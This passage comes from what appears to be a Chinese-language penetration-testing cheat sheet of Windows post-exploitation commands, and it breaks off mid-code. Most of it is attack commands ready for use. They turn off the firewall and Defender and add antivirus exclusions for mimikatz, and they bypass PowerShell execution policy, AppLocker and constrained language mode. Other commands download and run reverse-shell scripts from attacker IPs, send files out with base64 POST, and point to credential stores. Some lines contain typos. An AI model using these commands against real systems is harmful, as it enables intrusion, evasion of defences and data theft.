<h3 id="01-7-防火墙-防御者"><a href="#01-7-防火墙-防御者" class="headerlink" title="01.7 防火墙&#x2F;防御者"></a>01.7 防火墙&#x2F;防御者</h3><h4 id="01-7-1-防火墙"><a href="#01-7-1-防火墙" class="headerlink" title="01.7.1 防火墙"></a>01.7.1 防火墙</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 列出防火墙状态和当前配置</span><br>netsh advfirewall firewall dump<br>netsh firewall show state<br>netsh firewall show config<br>netsh advfirewall firewall show rule name=all<br><br><span class="hljs-comment">## ------------------| 列出防火墙规则</span><br><span class="hljs-built_in">Get-NetFirewallPortFilter</span><br><span class="hljs-built_in">Get-NetFirewallRule</span><br><span class="hljs-built_in">Get-NetFirewallRule</span> <span class="hljs-literal">-Direction</span> Outbound <span class="hljs-literal">-Enabled</span> True <span class="hljs-literal">-Action</span> Block<br><span class="hljs-built_in">Get-NetFirewallRule</span> <span class="hljs-literal">-Direction</span> Outbound <span class="hljs-literal">-Enabled</span> True <span class="hljs-literal">-Action</span> Allow<br><br><span class="hljs-comment">## ------------------| 添加防火墙规则以打开3306端口</span><br>netsh advfirewall firewall add rule name<span class="hljs-string">&quot;forward_port_rule&quot;</span> protocol=TCP <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> localip=&lt;compromised_ip&gt; localport <span class="hljs-number">3306</span> action=alow<br><br><span class="hljs-comment">## ------------------| 通过cmd禁用Windows 7上的防火墙</span><br>REG ADD <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server&quot;</span>  /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><br><span class="hljs-comment">## ------------------| 通过Powershell禁用Windows 7上的防火墙</span><br>powershell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-literal">-command</span> <span class="hljs-string">&#x27;Set-ItemProperty -Path &quot;HKLM:\System\CurrentControlSet\Control\Terminal Server&quot; -Name &quot;fDenyTSConnections&quot; –Value&#x27;</span>`<br><br><span class="hljs-comment">## ------------------| 通过cmd禁用任何窗口上的防火墙</span><br>netsh firewall <span class="hljs-built_in">set</span> opmode disable<br>netsh Advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br><br><span class="hljs-comment">## ------------------| 启用（psexec）对$ADMIN C$，IP$（Windows管理共享）的访问</span><br>REG add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d <span class="hljs-number">1</span> /f<br><br><span class="hljs-comment">## ------------------| 列出防火墙的阻止端口</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;<span class="hljs-variable">$f</span>=New-object -comObject HNetCfg.FwPolicy2;<span class="hljs-variable">$f</span>.rules |  where &#123;<span class="hljs-variable">$_</span>.action -eq &quot;</span><span class="hljs-number">0</span><span class="hljs-string">&quot;&#125; | select name,applicationname,localports;<span class="hljs-variable">$f</span>&quot;</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName, @&#123;Name=&#x27;Protocol&#x27;;Expression=&#123;(<span class="hljs-variable">$PSItem</span> | Get-NetFirewallPortFilter).Protocol&#125;&#125;, @&#123;Name=&#x27;LocalPort&#x27;;Expression=&#123;(<span class="hljs-variable">$PSItem</span> | Get-NetFirewallPortFilter).LocalPort&#125;&#125;, @&#123;Name=&#x27;RemotePort&#x27;;Expression=&#123;(<span class="hljs-variable">$PSItem</span> | Get-NetFirewallPortFilter).RemotePort&#125;&#125;, @&#123;Name=&#x27;RemoteAddress&#x27;;Expression=&#123;(<span class="hljs-variable">$PSItem</span> | Get-NetFirewallAddressFilter).RemoteAddress&#125;&#125;, Enabled, Profile, Direction, Action&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="01-7-2-防病毒和检测-禁用防御者"><a href="#01-7-2-防病毒和检测-禁用防御者" class="headerlink" title="01.7.2 防病毒和检测|禁用防御者"></a>01.7.2 防病毒和检测|禁用防御者</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check Defender Status</span><br><span class="hljs-built_in">Get-MpComputerStatus</span><br><br><span class="hljs-comment">## ------------------| 检查Defender排除列表</span><br><span class="hljs-built_in">Get-MpPreference</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-Property</span> ExclusionPath <span class="hljs-literal">-ExpandProperty</span> ExclusionPath<br><span class="hljs-built_in">Get-MpPreference</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-Property</span> ExclusionPath | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span><br><br><span class="hljs-comment">## ------------------| 禁用Defender</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Progra~1\Windows Defender&quot;</span><br>.\mpcmdrun.exe <span class="hljs-literal">-RemoveDefinitions</span> <span class="hljs-literal">-All</span><br><br><span class="hljs-comment">## ------------------| 禁用扫描所有下载的文件和附件，禁用AMSI（被动）</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span>; <span class="hljs-built_in">Get-MpComputerStatus</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIOAVProtection</span> <span class="hljs-variable">$true</span><br><br><span class="hljs-comment">## ------------------| 禁用AMSI（设置为0以启用）</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScriptScanning</span> <span class="hljs-number">1</span> <br><br><span class="hljs-comment">## ------------------| 排除文件夹、扩展名或进程</span><br><span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\Windows\Temp&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\Windows\Tasks&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\Windows\Temp\h4rithd&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-ExclusionProcess</span> <span class="hljs-string">&quot;mimikatz.exe&quot;</span>, <span class="hljs-string">&quot;winPEAS.exe&quot;</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionExtension</span> <span class="hljs-string">&quot;exe&quot;</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">## ------------------| 删除签名（如果存在Internet连接，则会再次下载）：</span><br><span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot;</span> <span class="hljs-literal">-RemoveDefinitions</span> <span class="hljs-literal">-All</span><br></code></pre></td></tr></table></figure>

<h3 id="01-8-默认位置"><a href="#01-8-默认位置" class="headerlink" title="01.8 默认位置"></a>01.8 默认位置</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Powershell默认位置</span><br>[<span class="hljs-type">x86</span>] C:\windows\syswow64\windowspowershell\v1.<span class="hljs-number">0</span>\powershell.exe<br>[<span class="hljs-type">x64</span>] C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.exe<br>[<span class="hljs-type">x64</span>] C:\windows\sysnative\windowspowershell\v1.<span class="hljs-number">0</span>\powershell.exe<br><br><span class="hljs-comment">## ------------------| 默认可写文件夹</span><br>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys<br>C:\Windows\System32\spool\drivers\color<br>C:\Windows\Tasks<br>C:\Windows\tracing<br>C:\Windows\Temp<br>C:\Users\Public<br><br><span class="hljs-comment">## ------------------| unattend.xml中的密码</span><br>C:\unattend.xml<br>C:\Windows\Panther\Unattend.xml<br>C:\Windows\Panther\Unattend\Unattend.xml<br>C:\Windows\system32\sysprep.inf<br>C:\Windows\system32\sysprep\sysprep.xml<br><br><span class="hljs-comment">## ------------------| 便笺密码</span><br>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite   <br><br><span class="hljs-comment">## ------------------| Powershell History</span><br><span class="hljs-built_in">type</span> %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br><span class="hljs-built_in">type</span> C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br><span class="hljs-built_in">type</span> <span class="hljs-variable">$env:APPDATA</span>\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br><span class="hljs-built_in">cat</span> (<span class="hljs-built_in">Get-PSReadlineOption</span>).HistorySavePath<br><span class="hljs-built_in">cat</span> (<span class="hljs-built_in">Get-PSReadlineOption</span>).HistorySavePath | <span class="hljs-built_in">sls</span> passw<br></code></pre></td></tr></table></figure>

<ul>
<li>公开可写目录（适用于任何用户）</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys<br>C:\Windows\system32\spool\drivers\color<br>C:\Users\PublicPort Forward<br>C:\Users\Public\Documents<br>C:\Windows\tracing<br>C:\Windows\Tasks<br>C:\Windows\Temp<br>C:\programdata<br></code></pre></td></tr></table></figure>

<h3 id="01-9-策略绕过"><a href="#01-9-策略绕过" class="headerlink" title="01.9 策略绕过"></a>01.9 策略绕过</h3><ul>
<li>PowerShell<strong>执行策略</strong> <a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/">绕过</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 检查/设置执行策略状态</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> RemoteSigned     <span class="hljs-comment"># 将策略设置为RemoteSigned。</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> Unrestricted     <span class="hljs-comment"># 将策略设置为“无限制”。</span><br><span class="hljs-built_in">Get-ExecutionPolicy</span>                  <span class="hljs-comment"># 验证执行策略的当前设置。</span><br><span class="hljs-built_in">Get-ExecutionPolicy</span> <span class="hljs-literal">-List</span> | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span><br><br><span class="hljs-comment">## ------------------| How to bypass</span><br><span class="hljs-comment">## 0) 如果你有evil-winrm访问权限；将rev.ps1文件复制到当前目录。然后</span><br>evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> &lt;IP&gt; <span class="hljs-literal">-u</span> &lt;USERNAME&gt; <span class="hljs-literal">-p</span> &lt;PASSWORD&gt;  <span class="hljs-literal">-s</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>)<br>rev.ps1<br>menu<br><br><span class="hljs-comment">## 1) 将脚本复制并粘贴到交互式PowerShell控制台</span><br><br><span class="hljs-comment">## 2) 在中从文件和管道读取脚本到PowerShell标准</span><br><span class="hljs-built_in">Get-Content</span> rev.ps1 | PowerShell.exe <span class="hljs-literal">-noprofile</span> -<br><span class="hljs-built_in">type</span> rev.ps1 | PowerShell.exe <span class="hljs-literal">-noprofile</span> -<br><br><span class="hljs-comment">## 3) 从URL下载脚本并使用Invoke-Expression执行</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://&lt;IP&gt;/rev.ps1&#x27;)&quot;</span><br><br><span class="hljs-comment">## 3) 使用“绕过”执行策略标志</span><br>PowerShell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-operator">-File</span> .\rev.ps1<br></code></pre></td></tr></table></figure>

<ul>
<li>绕过App Locker组策略</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 检查应用程序锁定器状态</span><br><span class="hljs-built_in">Get-ApplockerPolicy</span> <span class="hljs-literal">-Effective</span> <span class="hljs-literal">-xml</span><br><span class="hljs-built_in">Get-AppLockerPolicy</span> <span class="hljs-literal">-Effective</span> | <span class="hljs-built_in">select</span> <span class="hljs-literal">-ExpandProperty</span> RuleCollections<br><br><span class="hljs-comment">## ------------------| 绕过|将文件移动到以下路径</span><br>C:\Windows\Temp <br>C:\Windows\Tasks <br>C:\windows\tracing<br>C:\Windows\System32\FxsTmp<br>C:\Windows\System32\com\dmp<br>C:\Windows\SysWOW64\FxsTmp<br>C:\Windows\SysWOW64\com\dmp<br>C:\Windows\Registration\CRMLog<br>C:\Windows\System32\spool\SERVERS<br>C:\Windows\System32\spool\PRINTERS<br>C:\Windows\System32\spool\drivers\color<br>C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter<br>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys<br>C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter<br>C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System<br>C:\Windows\System32\Tasks_Migrated <span class="hljs-comment"># 在执行Windows 10的版本升级后</span><br><br><span class="hljs-comment">## ------------------| 使用Powerview绕过</span><br><span class="hljs-built_in">cp</span> /opt/PowerSploit/CodeExecution/<span class="hljs-built_in">Invoke-ReflectivePEInjection</span>.ps1 .<br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.14.26/Invoke-ReflectivePEInjection.ps1&#x27;</span>)  <br><span class="hljs-variable">$PEBytes</span> = [<span class="hljs-type">IO.File</span>]::ReadAllBytes(<span class="hljs-string">&#x27;full\path\for\application.exe&#x27;</span>)<br><span class="hljs-built_in">Invoke-ReflectivePEInjection</span> <span class="hljs-literal">-PEBytes</span> <span class="hljs-variable">$PEBytes</span><br><span class="hljs-comment">## Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs &quot;Arg1 Arg2 Arg3 Arg4&quot;</span><br><br><span class="hljs-comment">## ------------------| More info</span><br>https://github.com/api0cradle/UltimateAppLockerByPassList<br></code></pre></td></tr></table></figure>

<ul>
<li>PowerShell<strong>约束语言模式</strong> <a target="_blank" rel="noopener" href="https://github.com/padovah4ck/PSByPassCLM">绕过</a>。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 是否验证已启用约束语言模式？</span><br><span class="hljs-variable">$ExecutionContext</span>.SessionState.LanguageMode<br><br><span class="hljs-comment">## ------------------| Methord 01</span><br>powershell.exe <span class="hljs-literal">-version</span> <span class="hljs-number">2</span> <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://&lt;IP&gt;/rev.ps1&#x27;</span>)<br><br><span class="hljs-comment">## ------------------| Methord 02</span><br><span class="hljs-comment">## 您可以在函数内部运行命令，如-&gt;函数测试｛whoami｝和该equel to&amp;｛whuami｝ </span><br><span class="hljs-built_in">cp</span> /opt/nishang/Shells/<span class="hljs-built_in">Invoke-PowerShellTcp</span>.ps1 rev.ps1<br><span class="hljs-built_in">echo</span> <span class="hljs-literal">-e</span> <span class="hljs-string">&quot;Invoke-PowerShellTcp -Reverse -IPAddress &lt;HostIP&gt; -Port 4545&quot;</span> &gt;&gt; rev.ps1<br>python3 <span class="hljs-literal">-m</span> http.server <span class="hljs-number">80</span><br><span class="hljs-built_in">echo</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://&lt;HostIP&gt;/rev.ps1&#x27;)&quot;</span> | iconv <span class="hljs-literal">--to-code</span> UTF<span class="hljs-literal">-16LE</span> | base64 <span class="hljs-literal">-w</span> <span class="hljs-number">0</span>   <br>&amp;&#123; powershell <span class="hljs-literal">-enc</span> JABzAG0...Sad== &#125;<br><br><span class="hljs-comment">## ------------------| Using PsBypassCLM</span><br><span class="hljs-built_in">wget</span> https://github.com/h4rithd/PrecompiledBinaries/blob/main/PSBypassCLM/PsBypassCLM.exe<br><span class="hljs-comment">### Execute</span><br><span class="hljs-comment">### Place the binary in C:\Windows\Tasks\PsBypassCLM.exe</span><br>C:\Windows\Microsoft.NET\Framework64\v4.<span class="hljs-number">0.30319</span>\InstallUtil.exe /logfile= /LogToConsole=true /U C:\Windows\Tasks\PsBypassCLM.exe<br>C:\Windows\Microsoft.NET\Framework64\v4.<span class="hljs-number">0.30319</span>\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.38</span> /rport=<span class="hljs-number">4545</span> /U C:\Windows\Tasks\PsBypassCLM.exe<br></code></pre></td></tr></table></figure>

<ul>
<li>UAC绕过</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System<br><br><span class="hljs-comment">## Bypasing</span><br>https://github.com/hfiref0x/UACME<br>https://docs.h4rithd.com/windows/privilageesc<span class="hljs-literal">-windows</span><span class="hljs-comment">#01.-common-tricks    </span><br></code></pre></td></tr></table></figure>

<h3 id="01-10-上传-下载-执行"><a href="#01-10-上传-下载-执行" class="headerlink" title="01.10 上传&#x2F;下载&#x2F;执行"></a>01.10 上传&#x2F;下载&#x2F;执行</h3><ul>
<li>上传文件。</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$b64</span> = [<span class="hljs-type">System.convert</span>]::ToBase64String((<span class="hljs-built_in">Get-Content</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;C:/&lt;PATH&gt;/BloodHound.zip&#x27;</span> <span class="hljs-literal">-Encoding</span> Byte))     <br><span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-literal">-Uri</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.25</span>:<span class="hljs-number">443</span> <span class="hljs-literal">-Method</span> POST <span class="hljs-literal">-Body</span> <span class="hljs-variable">$b64</span><br><br><span class="hljs-comment">## Download file with netcat</span><br><span class="hljs-built_in">echo</span> &lt;base64&gt; | base64 <span class="hljs-literal">-d</span> <span class="hljs-literal">-w</span> <span class="hljs-number">0</span> &gt; bloodhound.zip<br><br><span class="hljs-comment">## ------------------| 后台智能传输服务（BITS）</span><br><span class="hljs-built_in">Start-BitsTransfer</span> <span class="hljs-string">&quot;C:\Temp\bloodhound.zip&quot;</span> <span class="hljs-literal">-Destination</span> <span class="hljs-string">&quot;http://10.10.10.132/uploads/bloodhound.zip&quot;</span> <span class="hljs-literal">-TransferType</span> Upload <span class="hljs-literal">-ProxyUsage</span> Override <span class="hljs-literal">-ProxyList</span> PROXY01:<span class="hljs-number">8080</span> <span class="hljs-literal">-ProxyCredential</span> INLANEFREIGHT\svc<span class="hljs-literal">-sql</span>   <br></code></pre></td></tr></table></figure>

<ul>
<li>下载文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 旧版本（支持任何版本）</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63/nc.exe&#x27;, &#x27;C:\Users\Public\nc.exe&#x27;)&quot;</span> <br><br><span class="hljs-comment">## ------------------| 新版本（别名IWR）</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;Invoke-WebRequest http://10.10.14.26/nc.exe -OutFile C:\Users\Public\nc.exe&quot;</span><br><br><span class="hljs-comment">## ------------------| 在内存中执行（别名IEX）</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.25/revshell.ps1&#x27;)&quot;</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;Invoke-WebRequest http://10.10.14.25/revshell.ps1 | iex&quot;</span><br><br><span class="hljs-comment">## ------------------| Internet Explorer的首次运行错误（-useBasicParsing）</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IWR -useBasicParsing http://10.10.14.26/nc.exe -o C:\Users\Public\nc.exe&quot;</span><br><span class="hljs-comment">### 如果您有管理员访问权限，您可以禁用Internet Explorer的首次运行自定义</span><br>reg add <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Internet Explorer\Main&quot;</span> /f /v DisableFirstRunCustomize /t REG_DWORD /d <span class="hljs-number">2</span><br><br><span class="hljs-comment">## ------------------| CMD ways</span><br>certutil <span class="hljs-literal">-urlcache</span> <span class="hljs-operator">-split</span> <span class="hljs-operator">-f</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.26</span>/nc.exe C:\Users\Public\nc.exe<br><br><span class="hljs-comment">## ------------------| Using Curl</span><br>powershell <span class="hljs-built_in">curl</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.11</span>/rev.ps1<br><br><span class="hljs-comment">## ------------------| 后台智能传输服务（BITS）</span><br>bitsadmin /transfer n http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.32</span>/nc.exe C:\Temp\nc.exe<br><span class="hljs-built_in">Import-Module</span> bitstransfer;<span class="hljs-built_in">Start-BitsTransfer</span> <span class="hljs-literal">-Source</span> <span class="hljs-string">&quot;http://10.10.10.32/nc.exe&quot;</span> <span class="hljs-literal">-Destination</span> <span class="hljs-string">&quot;C:\Temp\nc.exe&quot;</span> <br></code></pre></td></tr></table></figure>

<ul>
<li>执行文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Remote</span><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://10.10.14.26/SharpHound.ps1&#x27;</span>)<br><br><span class="hljs-comment">## ------------------| Local</span><br>.\rev.ps1<br><span class="hljs-built_in">Import-Module</span> .\rev.ps1<br></code></pre></td></tr></table></figure>

<h3 id="01-11-编码-解码"><a href="#01-11-编码-解码" class="headerlink" title="01.11 编码&#x2F;解码"></a>01.11 编码&#x2F;解码</h3><ul>
<li>编码有效负载</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Encode the payload </span><br><span class="hljs-built_in">echo</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.26/rev.ps1&#x27;)&quot;</span> | iconv <span class="hljs-literal">--to-code</span> UTF<span class="hljs-literal">-16LE</span> | base64 <span class="hljs-literal">-w</span> <span class="hljs-number">0</span>   <br><br><span class="hljs-comment">## ------------------| Run the payload</span><br>powershell <span class="hljs-literal">-EncodedCommand</span> SQBFAFgAKABOA.....ApAA==<br></code></pre></td></tr></table></figure>

<ul>
<li>将文件编码为 base64</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Method I</span><br>powershell <span class="hljs-literal">-c</span> [<span class="hljs-type">convert</span>]::ToBase64String((<span class="hljs-built_in">cat</span> C:\windows\system32\license.rtf <span class="hljs-literal">-Encoding</span> byte))<br><br><span class="hljs-comment">## ------------------| Method II</span><br>certutil <span class="hljs-literal">-encode</span> C:\windows\system32\license.rtf license<span class="hljs-literal">-b64</span>.out<br><br><span class="hljs-comment">## ------------------| Method III</span><br><span class="hljs-variable">$fc</span> = <span class="hljs-built_in">Get-Content</span> <span class="hljs-string">&quot;file name.txt&quot;</span><br><span class="hljs-variable">$fc</span><br><span class="hljs-variable">$fe</span> = [<span class="hljs-type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-variable">$fc</span>)<br>[<span 